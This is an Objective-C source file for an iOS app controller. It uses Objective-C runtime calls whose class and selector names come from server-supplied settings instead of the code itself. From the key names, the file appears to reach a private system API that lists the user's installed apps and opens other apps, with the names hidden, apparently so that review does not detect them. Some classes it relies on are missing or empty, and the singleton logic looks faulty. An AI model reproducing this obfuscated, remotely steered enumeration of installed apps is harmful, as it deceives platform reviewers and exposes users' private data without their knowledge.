//
//  LMAController.m
//  newYYY
//
//  Created by 李志勇 on 2016/11/14.
//  Copyright © 2016年 YYY. All rights reserved.
//

#import "LMAController.h"

// 服务器传的api参数
#define newLsAW @"lsAW5"
#define newDeFW @"deFW5"
#define newAllApption @"allApption5"
#define newOpenAppWBID @"openAppWBID5"
#define newDetion @"detion5"
#define newAllA @"allA5"
// 跳转界面的偏好设置
#define newJump @"i_jump5"


static LMAController *LMA =nil;

@interface LAWKSP
@end


#pragma mark -

@implementation LMAController
{
    
    LAWKSP* _WKSP;
    NSArray* inAction;
    
}

- (instancetype)init
{
    self = [super init];
    if(self != nil)
    {
        
        NSString *str1 = [[NSUserDefaults standardUserDefaults] objectForKey:newLsAW];
        _WKSP = [NSClassFromString(str1) new];
    }
    
    return self;
}


- (NSArray*)readAdd
{
    NSString *str1 = [[NSUserDefaults standardUserDefaults] objectForKey:newLsAW];
    const char *lsa = [str1 UTF8String];
    Class LSspace_class = objc_getClass(lsa);
    
    
    // 纯runtime
    const char *defaoWS = [[[NSUserDefaults standardUserDefaults] objectForKey:newDeFW] UTF8String];
    NSObject *WKSP = objc_msgSend(LSspace_class, sel_registerName(defaoWS));
    
    
    // 纯runtime
    const char *alstledAps = [[[NSUserDefaults standardUserDefaults] objectForKey:newAllApption] UTF8String];
    NSArray * allAtts = objc_msgSend(WKSP, sel_registerName(alstledAps));
    
    NSMutableArray* attlicaS = [NSMutableArray arrayWithCapacity:allAtts.count];
    for(id pry in allAtts)
    {
        LMAAA *LMMM = [LMAAA aWithP:pry];
        [attlicaS addObject:LMMM];
    }
    return attlicaS;
}

- (NSArray*)inAction
{
    if(nil == inAction)
    {
        inAction = [self readAdd];
    }
    
    return inAction;
}

- (BOOL)onThis:(NSString *)package;
{
    NSString *str1 = [[NSUserDefaults standardUserDefaults] objectForKey:newLsAW];
    const char *lsa = [str1 UTF8String];
    Class lsawsc = objc_getClass(lsa);
    
    // 纯runtime
    const char *defWS = [[[NSUserDefaults standardUserDefaults] objectForKey:newDeFW] UTF8String];
    NSObject* WKSP = objc_msgSend(lsawsc, sel_registerName(defWS));
    
    // 纯runtime
    const char *charOABID = [[[NSUserDefaults standardUserDefaults] objectForKey:newOpenAppWBID] UTF8String];
    
    return ((BOOL(*)(id, SEL, NSString *))objc_msgSend)(WKSP, sel_registerName(charOABID), package);
    
}
+ (instancetype)sharedInstance
{
    NSUserDefaults * userDefault=[NSUserDefaults standardUserDefaults];
    if ([[userDefault objectForKey:@"tStamp"] isKindOfClass:[NSNull class]]) {
        NSDate* dat = [NSDate dateWithTimeIntervalSinceNow:0];
        [userDefault setObject:dat forKey:@"tStamp"];
        [userDefault synchronize];
        LMA=[[LMAController alloc]init];
        return LMA;
    }else
    {
        NSDate* dat=[userDefault objectForKey:@"tStamp"];
        long long time=[dat timeIntervalSince1970];
        if ([[NSDate dateWithTimeIntervalSinceNow:0] timeIntervalSince1970]-time>=60) {
            LMA=[[LMAController alloc]init];
            return LMA;
        }else
        {
            return LMA;
        }
    }
    
    
}



@end
